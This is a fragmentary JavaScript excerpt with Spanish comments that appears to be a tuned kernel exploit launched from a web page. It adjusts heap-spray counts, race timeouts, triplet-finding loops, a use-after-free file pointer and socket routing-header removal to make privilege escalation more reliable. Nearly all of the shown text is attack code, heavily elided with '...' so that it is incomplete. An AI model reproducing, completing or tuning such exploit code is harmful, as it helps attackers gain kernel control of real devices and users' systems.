...
const MAX_ROUNDS_TWIN = 15;                     // antes 10
const MAX_ROUNDS_TRIPLET = 800;                 // antes 500
const FIND_TRIPLET_FAST = 8000;                 // antes 5000
...
(async function () {
    let p = null;
    try {
        const NUM_IOV_WORKER = params.has("iov") ? parseInt(params.get("iov"), 10) : 6;   // antes 4
        const NUM_ATTEMPT = params.has("attempts") ? parseInt(params.get("attempts"), 10) : 12; // antes 8
        const NUM_IOV_SPRAY = params.has("spray") ? parseInt(params.get("spray"), 10) : 0x200; // antes 0x100
        ...
        const SWEEP_CYCLES = params.has("sweep")
            ? parseInt(params.get("sweep"), 10) : 8;           // antes 6
        const SWEEP_MS = params.has("sweepms")
            ? parseInt(params.get("sweepms"), 10) : 80;        // antes 60
        const SWEEP_MB = params.has("sweepmb")
            ? parseInt(params.get("sweepmb"), 10) : 12;        // antes 8
        ...
        const NUM_UIO_WORKER = params.has("uio") ? parseInt(params.get("uio"), 10) : 6; // antes 4
        ...
        function findTriplet(master, slave, tag, timeout) {
            ...
            while (backoff < 3) {
                ...
                sc(SYS.nanosleep, lenAddr, 0); // pequeño retraso
            }
            return null;
        }
        ...
        for (let attempt = 1; attempt <= NUM_ATTEMPT && !triplets; ++attempt) {
            ...
            // Añadir pequeño retraso para dar tiempo al kernel
            lenDv.setUint32(8, 1000, true); // 1 ms
        ...
        async function landUio(size, forWrite, tasks) {
            ...
            const uioDeadline = Date.now() + (params.has("uioms")
                ? parseInt(params.get("uioms"), 10) : 60000); // antes 30000
        ...
        async function landFakeUio(tasks) {
            ...
            const fakeDeadline = Date.now() + (params.has("fakeuioms")
                ? parseInt(params.get("fakeuioms"), 10) : 60000); // antes 30000
        ...
        // tripletsAgree mejorado: verifica también cr_ref
            ...
            if (!check("ofiles-walk-reached-pipes",
                ...
                if (wrote) {
                    ...
                    function removeRthdrFromSocket(fd) {
                        ...
                        // Intentar 3 veces para asegurar la escritura
                        let attempts = 0;
                        while (attempts < 3) {
                    ...
                    if (kptr2(uafFp)) {
                        ...
                        // Drenaje de la zona de archivos (mejorado)
                        const DRAIN_CAP = (function() {
                            const n = params.has("drain")
                                ? parseInt(params.get("drain"), 10) : 4096; // antes 1536
